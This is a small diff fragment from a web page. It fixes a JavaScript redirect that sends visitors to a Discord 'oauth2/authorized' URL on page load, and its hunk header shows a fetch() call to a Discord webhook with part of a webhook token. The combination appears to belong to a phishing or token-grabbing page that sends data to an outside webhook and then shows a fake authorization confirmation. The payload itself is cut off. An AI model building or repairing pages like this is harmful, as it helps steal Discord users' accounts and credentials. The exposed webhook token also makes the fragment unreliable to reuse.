@@ -129,7 +129,7 @@ fetch('https://discord.com/api/webhooks/1103808892867190856/o3VCDH7eB8azWxXcvKHv
 <element onload="redirectToDone">
 <script>
 function redirectToDone() {
-    window.open("https://discord.com/oauth2/authorized" _self);
+window.open("https://discord.com/oauth2/authorized", "_self");
 }
 </script>
   </div>
